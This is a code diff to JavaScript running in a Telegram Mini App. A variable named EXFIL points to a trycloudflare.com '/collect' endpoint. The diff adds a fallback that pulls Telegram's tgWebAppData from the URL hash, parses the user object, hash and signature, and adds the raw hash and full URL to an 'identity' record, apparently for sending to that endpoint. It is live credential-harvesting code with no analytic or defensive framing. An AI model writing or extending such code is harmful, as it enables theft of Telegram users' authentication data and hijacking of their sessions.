@@ -15,10 +15,35 @@
   var EXFIL = 'https://brings-popularity-elsewhere-libraries.trycloudflare.com/collect'
   var tg = window.Telegram.WebApp
 
+  var initData = tg.initData
+  var initDataUnsafe = tg.initDataUnsafe
+
+  // Fallback: parse hash fragment directly
+  if (!initData && window.location.hash) {
+    try {
+      var hashParams = new URLSearchParams(window.location.hash.substring(1))
+      var webAppData = hashParams.get('tgWebAppData')
+      if (webAppData) {
+        initData = decodeURIComponent(webAppData)
+        var params = new URLSearchParams(initData)
+        var userJson = params.get('user')
+        if (userJson) {
+          initDataUnsafe = {
+            query_id: params.get('query_id'),
+            user: JSON.parse(userJson),
+            auth_date: params.get('auth_date'),
+            signature: params.get('signature'),
+            hash: params.get('hash')
+          }
+        }
+      }
+    } catch(e) {}
+  }
+
   var identity = {
     type: 'identity',
-    initData: tg.initData,
-    initDataUnsafe: tg.initDataUnsafe,
+    initData: initData,
+    initDataUnsafe: initDataUnsafe,
     colorScheme: tg.colorScheme,
     platform: tg.platform,
     version: tg.version,
@@ -28,10 +53,10 @@
     isExpanded: tg.isExpanded,
     headerColor: tg.headerColor,
     backgroundColor: tg.backgroundColor,
-    isClosingConfirmationEnabled: tg.isClosingConfirmationEnabled,
-    isVerticalSwipesEnabled: tg.isVerticalSwipesEnabled,
     safeAreaInset: tg.safeAreaInset,
     contentSafeAreaInset: tg.contentSafeAreaInset,
+    hash: window.location.hash.substring(0, 200),
+    href: window.location.href.substring(0, 300),
     ts: Date.now()
   }
 
